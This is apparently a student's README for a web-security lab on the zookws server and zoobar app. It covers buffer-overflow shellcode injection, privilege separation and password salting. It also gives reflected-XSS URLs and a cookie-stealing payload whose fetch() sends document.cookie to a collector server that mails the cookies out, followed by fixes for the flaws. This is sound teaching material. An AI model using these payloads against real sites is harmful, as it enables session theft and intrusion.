# ZOOKWS  Web Server:
<img alt="image" height="200" src="https://user-images.githubusercontent.com/13490629/220829558-2be8d780-e804-48bc-9d6b-6d3beec84033.png"/>

<!-- TOC -->
* [ZOOKWS  Web Server:](#zookws--web-server-)
* [1.1 Finding Buffer Overflows](#11-finding-buffer-overflows)
* [1.2 Code Injection](#12-code-injection)
    * [Part 1 - Writing assembly code that unlinks a file (shellcode.S)](#part-1---writing-assembly-code-that-unlinks-a-file--shellcodes-)
    * [Part 2 - Find the target buffer bounderies and modify "exploit-template.py"](#part-2---find-the-target-buffer-bounderies-and-modify--exploit-templatepy-)
* [2.1 privilege separation](#21-privilege-separation)
    * [Part 1 - Prepare the environment](#part-1---prepare-the-environment)
    * [Part 2 - Run the web server](#part-2---run-the-web-server)
    * [Part 3 - Test code injection exploit](#part-3---test-code-injection-exploit)
* [2.2.1 privilege separating login service](#221-privilege-separating-login-service)
    * [Part 1 - Prepare the environment](#part-1---prepare-the-environment-1)
    * [Part 2 - Run the web server](#part-2---run-the-web-server-1)
* [2.2.2. Password Hashing and Salting](#222-password-hashing-and-salting)
* [2.3. privilege separating bank service](#23-privilege-separating-bank-service)
    * [Part 1 - Prepare the environment](#part-1---prepare-the-environment-2)
    * [Part 2 - Run the web server](#part-2---run-the-web-server-2)
* [3. Browser Protection](#3-browser-protection)
  * [3.1. Remote Execution - Reflected Cross-site Scripting](#31-remote-execution---reflected-cross-site-scripting)
  * [3.2. Steal Cookies](#32-steal-cookies)
  * [3.3. Protect, Fix the XSS Vulnerability](#33-protect-fix-the-xss-vulnerability)
* [4. Fixing the Vulnerabilities](#4-fixing-the-vulnerabilities)
    * [following are few more vulnerabilities that I found in the zoobar application and how I fixed them](#following-are-few-more-vulnerabilities-that-i-found-in-the-zoobar-application-and-how-i-fixed-them)
      * [1. Login attempts are not limited:](#1-login-attempts-are-not-limited-)
      * [2. No validation for zoobar input:](#2-no-validation-for-zoobar-input-)
      * [3. Use eval() to parse input in transfer.py:](#3-use-eval---to-parse-input-in-transferpy-)
<!-- TOC -->

___
# 1.1 Finding Buffer Overflows

The **zookws** web server is running a simple python web application, **zoobar**, where users transfer "zoobars" (
credits) between each other.

### Installation and execution
1. Using command line, navigate to the project directory
   ```sh
   cd ~/zookws/ 
   ```
2. Compile the code
   ```sh
   make all 
   ```
3. Run the server (args: {port:8080})
   ```sh
   ./zookd-exstack 8080
   ```
4. Test the exploit-template.py script in another terminal window (args: host=localhost, port=8080, overflow=1200)
   ```sh
   python ./exploit-template.py localhost 8080 1200
   ```

## Application layout and potential buffer overflows

<div style="text-align:center;display:flex;flex-direction: column; width: 100%">
    <img src="https://user-images.githubusercontent.com/13490629/217200886-83e8b9be-3508-4bea-9faf-97470a3ec877.png" style="display: block;-webkit-user-select: none;margin: auto;"><br/>
    <img src="https://user-images.githubusercontent.com/13490629/217201214-f8f4ccf9-11ef-4bc4-9b78-9960856a3608.png" style="display: block;-webkit-user-select: none;margin: auto;"><br/>
    <img src="https://user-images.githubusercontent.com/13490629/217201420-d668b7d7-3817-4154-a7ff-98aa298a9ed6.png" style="display: block;-webkit-user-select: none;margin: auto;"><br/>
    <img src="https://user-images.githubusercontent.com/13490629/217203457-8000f037-6039-4fdc-b827-4b6d61f8e67a.png" style="display: block;-webkit-user-select: none;margin: auto;"><br/>
    <img src="https://user-images.githubusercontent.com/13490629/217203965-c89aa02a-2dc8-4831-9b69-5807c564be64.png" style="display: block;-webkit-user-select: none;margin: auto;">
</div><br/>

![image](https://user-images.githubusercontent.com/13490629/217298168-6ed747f9-9a04-4285-9ed2-b43f75943940.png)

# 1.2 Code Injection

The goal here is to injected code will unlink (remove) a sensitive file on the server, namely
"grades.txt". using the *-exstack binaries, since they have an executable stack that
makes it easier to inject code.

### Part 1 - Writing assembly code that unlinks a file (shellcode.S)

Afterwards, compile the assembly code into a binary file (shellcode.bin)


![image](https://user-images.githubusercontent.com/13490629/217405206-8b65493e-3ce9-498a-877e-9ae5da96d99b.png)

**Testing the "shellcode.bin"**

* Make sure that "grades.txt" exist at the project folder
* Compile using make aand run the "run-shellcode" program providing the "shellcode.bin" path as argument

  ```shell
  ./run-shellcode shellcode.bin
  ```

### Part 2 - Find the target buffer bounderies and modify "exploit-template.py"

And then inject the compiled Shellcode.S to be executed on the web server:

Here I choose the “value[512]” variable of “http\_request\_headers” function, the exploit will send the shellcode so it will fill the start of the “value” variable buffer. And the calculate the remaining space until the return pointer of the function, and overwrite the return pointer with the address of the start of the exploited buffer where the compiled shellcode start and by this the function will return back to itself and execute the shellcode which will delete the grades.txt file from the server.

![image](https://user-images.githubusercontent.com/13490629/217408210-fafb45b9-1873-4791-b883-25e6b2004d34.png)

![image](https://user-images.githubusercontent.com/13490629/217408292-56c0523e-24da-4eb2-9807-dd01034b9f83.png)

To run this exploit, first run the server on desired port

```shell
./zookd-exstack 8080

```

Then while the server is running , execute the exploit-template.py script and watch how the "grades.txt" file is deleted.

```shell
python ./exploit-template.py localhost 8080
```
# 2.1 privilege separation

Privilege separation challenges: first, requires to take apart the application and split it up in separate
pieces.  Second, ensure that each piece runs with minimal privileges, which
requires setting permissions precisely and configuring the pieces correctly.

![image](https://user-images.githubusercontent.com/13490629/220488413-371caf62-1b00-4f95-8748-fa2caa153b67.png)

### Part 1 - Prepare the environment

* Create jail directory
* Create virtual environment for the web server python code in the jail directory
* Install the required python packages in the virtual environment
* compile the c code and check for required files and directories and copy them to the jail directory
* copy any required packages and environment variables to the jail directory
* change the owners and permissions of the jail directory properly

the setup.sh script will do all the above steps

```shell
cd project/directory
make all
sudo ./setup.sh
```


### Part 2 - Run the web server

* Activate the virtual environment
* Run the web server loader executable zookld which is the only executable that runs with root privileges and located out of jail directory
* then the zookld will load the web server executable zookd and zookhttp processes by attaching each process to new forked chrooted jail process

```shell
cd jail/directory
source venv/bin/activate
cd project/directory
sudo ./zookld 8080
```

### Part 3 - Test code injection exploit

* Run the web server with zookld-exstack executable which execute the http service tht compiled with executable stack (zookhttp-exstack)
* Run the exploit-template2.py

```shell
cd jail/directory
source venv/bin/activate
cd project/directory
sudo ./zookld-exstack 8080
```

![image](https://user-images.githubusercontent.com/13490629/219696223-483cc4a1-a10a-46b4-bc65-aeb796c2d1d5.png)

# 2.2.1 privilege separating login service

Separate the code that deals with user authentication (i.e., passwords and tokens) from the rest of the application code.
The current zoobar application stores everything about the user (their profile, their zoobar balance, and authentication info)
in the Person table (see zoodb.py).
We want to move the authentication info out of the Person table into a separate Cred table (Cred stands for Credentials),
and move the code that accesses this authentication information (i.e., auth.py) into a separate service.

![image](https://user-images.githubusercontent.com/13490629/220485069-e0f3a8cf-0fe9-4478-8dbe-ffd083885d85.png)
### Part 1 - Prepare the environment

* Create jail directory
* compile the c code and check for required files and directories and copy them to the jail directory
* copy any required packages and environment variables to the jail directory
* change the owners and permissions of the jail directory properly

the setup.sh script will do all the above steps

```shell
cd project/directory
make all
sudo ./setup.sh
```

### Part 2 - Run the web server

* Run the web server loader executable zookld which is the only executable that runs with root privileges and located out of jail directory
* then the zookld will load the web server executable zookd, zookhttp and authsvc processes by attaching each process to new forked chrooted jail process

```shell
cd project/directory
sudo ./zookld 8080
```

# 2.2.2. Password Hashing and Salting

Implement password hashing and salting in the authentication service.
* Extending the cred table to include a salt column.
* modify register and login functions to use the salt column.
* store the salt in the database and use it to hash the password before storing it in the database.

# 2.3. privilege separating bank service

To improve the security of zoobar balances, the plan is similar to operations made on the authentication service:
split the zoobar balance information into a separate Bank database, and set up a bank_svc service,
whose job it is to perform operations on the new Bank database and the existing Transfer database.
As long as only the bank_svc service can modify the Bank and Transfer database.
![image](https://user-images.githubusercontent.com/13490629/220483589-ac36ae9f-fc2a-45eb-b907-80167cc4e4b9.png)
### Part 1 - Prepare the environment

* Create jail directory
* compile the c code and check for required files and directories and copy them to the jail directory
* copy any required packages and environment variables to the jail directory
* change the owners and permissions of the jail directory properly

the setup.sh script will do all the above steps

```shell
cd project/directory
make all
sudo ./setup.sh
```

### Part 2 - Run the web server

* Run the web server loader executable zookld which is the only executable that runs with root privileges and located out of jail directory
* then the zookld will load the web server executable zookd, zookhttp and authsvc processes by attaching each process to new forked chrooted jail process

```shell
cd project/directory
sudo ./zookld 8080
```
<br>
<br>

#### alternative all the above steps can be done automatically by running the following command

```shell
cd project/directory
sudo ./launch.sh 8080 1
```
* the second argument is indicator if we want to start fresh jail or completely delete the jail directory and start fresh


# 3. Browser Protection
## 3.1. Remote Execution - Reflected Cross-site Scripting

The goal is to create a URL that, when accessed, will cause the victim's browser to execute some JavaScript you as the attacker has supplied.
* When examining a URLs, there is one where the parameter is sent along with the URL, and then reflected back to the user view.
* The url is http://localhost:8080/zoobar/index.cgi/users?user=user_name
* The user_name parameter is reflected back to the search box in the users page and its actually part of the value attribute of the input tag
* By replacing the user_name with a javascript code, we can execute the javascript code in the victim's browser
* The javascript code that will be executed is alert(document.cookie); which will pop up an alert box with the victim's cookies
* in order to execute the javascript code, we need to escape the double quotes and the angle brackets.
* The final url will be http://localhost:8080/zoobar/index.cgi/users?user=%22%3Cp%3E%3Cscript%3Ealert(document.cookie);%3C/script%3E%3C/p%3E%22
* this will translate to ``` "<p><script>alert(document.cookie);</script></p>" ``` which will be reflected and print the victim's cookies in an alert box

### Following are screenshots of the attack:

#### finding the reflected parameter:

<img alt="image" src="https://user-images.githubusercontent.com/13490629/220351090-0779ae1b-2759-4572-a71c-edab7bb23eda.png" width="500"/>

#### finding the dom element that affected by the reflected parameter:

<img alt="image" height="500" src="https://user-images.githubusercontent.com/13490629/220351201-c61efa0b-17c8-4b2d-b61e-2cf8f8ff17aa.png"/>

#### testing the attack:

![image](https://user-images.githubusercontent.com/13490629/220351284-d2ba3c53-f03c-4e76-b878-cf627d515ef0.png)


## 3.2. Steal Cookies
* creating different url from previous attack, this making sure that the victim won't notice the attack
```html
 <!-- original source -->
<input type="text" name="user" value="{{ req_user }}" size=10></span><br>
<!-- the final payload -->
"size=10><script>fetch(`http://localhost:3000/cookie/${document.cookie}`)</script><input type="hidden
```
* creating **"send_mail.sh"** shell script that will send the cookies to my mail
```shell
#!/bin/bash 
.
echo "Cookie value is: $1" | mail -s "$SUBJECT" "$TO"
.
.
```

* creating python server **"evil_server.py"** that will listen to the request and get the cookies as request parameter
* the python server will execute the shell script and send the cookies to my mail
```python
.
server = HTTPServer((host, port), RequestHandler)
.
.
cookie = os.path.basename(path).replace('cookie/', '')
.
.
output = subprocess.check_output(['sh', 'send_mail.sh', cookie])
.
.
```
## 3.3. Protect, Fix the XSS Vulnerability

* To fix the vulnerability, we need to escape the user input before printing it to the page using request.form.get() function
* this way, the input will be escaped and won't reflect directly to the page
* the line that need to be changed is in the **"users.html"** file
```html
- <!--<input type="text" name="user" value="{{ req_user }}" size=10></span><br>-->
+ <input type="text" name="user" value="{{ request.form.get('user', '') }}" size=10></span><br>
```
# 4. Fixing the Vulnerabilities
___
### following are few more vulnerabilities that I found in the zoobar application and how I fixed them

#### 1. Login attempts are not limited:
###### **vulnerability:**
1. Attacker can try to brute force the password of a user
2. Attacker can try to brute force other usernames
###### **fix:**
<p style="width: 80%; ">
To fix the first login I had to limit the number of login attempts to 5 attempts per 2 minutes and block the user for 2 minutes if the user exceeded the limit
But then I found another vulnerability, the attacker can try to brute force other usernames, so i added delay of 1 second after each login attempt to prevent brute force attacks or at least make it harder for the attacker to brute force other usernames
</p>

###### **implementation:**
* created new table in the database named failed_logins which store the number of login attempts and the time of the last login attempt for each user.
<ul style="width: 80%; ">
  <li>
Add new table in the database named failed_logins which store the number of login attempts and the time of the last login attempt for each user.
  </li>
  <br>
  <li>
  Modify the "checkLogin" function in login.py file which check if the user exceeded the limit before actually trying to log in the user.
  if the user exceeded the limit, the user will be blocked for 2 minutes and the user will be able to login again after 2 minutes.
  if the user didn't exceed the limit, and the login failed, a new record will be added to the failed_logins table with the time of the 
  last login attempt for the user 
  if the user didn't exceed the limit, and the login succeeded, the records for the user will be deleted from the failed_logins table.
  </li>
</ul>

**The database schema for the failed_logins table:**
```python
class FailedLogin(CredBase):
    __tablename__ = 'failed_logins'

    id = Column(Integer, primary_key=True)
    cred_id = Column(String, ForeignKey('cred.username'))
    cred = relationship("Cred", back_populates="failed_logins")
    timestamp = Column(DateTime)
```
**The "checkLogin" function modification in login.py file:**
```python
    def checkLogin(self, username, password, blocking_duration_minutes=2, max_attempts=5):
        now = datetime.now()
        cred = Cred.get_by_username(username)
        attempts = FailedLogin.get_failed_attempts(cred, now, blocking_duration_minutes)
        if len(attempts) >= max_attempts:  # Too many failed attempts
            time_left = get_remaining_time(attempts, now, blocking_duration_minutes)
            login_error = "Too many failed attempts. Try again in %s" % time_left
            return login_error
        # Check credentials
        token = auth_client.login(username, password)
        if token is not None:  # Successful login
            FailedLogin.delete_failed_attempts(attempts)
            return self.loginCookie(username, token)
        else:  # Failed login
            FailedLogin.add_failed_attempt(cred)
            # Sleep for 1 second to prevent brute force attacks
            time.sleep(1) 
            return None
```

<br>

#### 2. No validation for zoobar input:
###### **vulnerability:**
1. User can send zoobars to himself
2. Attacker can steal zoobars from a user by sending negative zoobars to the user
###### **fix:**
<p style="width: 80%; ">
Add validation to the zoobar input to prevent the user from sending zoobars to himself and to prevent the attacker from stealing zoobars from a user by sending negative zoobars to the user
</p>

###### **implementation:**
* modify the "transfer" function in the bank.py file .
```python
def transfer(sender, recipient, zoobars, token):
    if not auth_client.check_token(sender,token):
        return "Invalid token!"
    db = bank_setup()
    sender_bank = db.query(Bank).get(sender)
    recipient_bank = db.query(Bank).get(recipient)
    if sender_bank is None:
        return "Sender does not exist!"
    if recipient_bank is None:
        return "Recipient does not exist!"
    if zoobars < 0:
        return "Cannot transfer negative zoobars!"
    # check if recipient is sender
    if sender == recipient:
        return "Cannot transfer zoobars to yourself!"
    sender_balance = sender_bank.zoobars - zoobars
    recipient_balance = recipient_bank.zoobars + zoobars
    if sender_balance < 0 or recipient_balance < 0:
        return "Insufficient funds!"

    sender_bank.zoobars = sender_balance
    recipient_bank.zoobars = recipient_balance
    db.commit()

    log_transfer(sender, recipient, zoobars)
    return "Transfer successful!"
```

<br>

#### 3. Use eval() to parse input in transfer.py:
###### **vulnerability:**
1. Attacker can execute arbitrary code on the server

###### **fix:**
<p style="width: 80%; ">
The eval call was there to parse the input of transfer form to convert the zoobars input to an integer, so I replaced the eval call with int() function to parse the input to an integer. 
and also validated that the input is an integer to prevent error exceptions.
</p>

###### **implementation:**
* modify the "transfer" function in the transfer.py file .
```python
@catch_err
@requirelogin
def transfer():
    warning = None
    try:
        if 'recipient' in request.form:
            zoobars = 0
            if request.form['zoobars'].isnumeric():
                zoobars = int(request.form['zoobars'])
            res = bank_client.transfer(g.user.person.username,request.form['recipient'], zoobars, g.user.token)
            warning = "%s" % res
    except (KeyError, ValueError, AttributeError) as e:
        traceback.print_exc()
        warning = "Transfer to %s failed" % request.form['recipient']
    return render_template('transfer.html', warning=warning)

```


